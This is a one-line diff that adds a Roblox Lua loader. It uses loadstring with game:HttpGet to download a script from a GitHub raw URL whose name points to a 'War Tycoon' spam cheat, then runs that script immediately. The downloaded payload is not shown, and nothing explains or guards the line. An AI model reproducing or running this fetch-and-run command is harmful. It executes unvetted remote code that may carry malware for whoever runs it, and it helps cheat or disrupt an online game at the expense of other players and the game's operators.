@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/kf-41-war-tycoon-spam0-mbfnn5t5ihkrrc.lua"))()
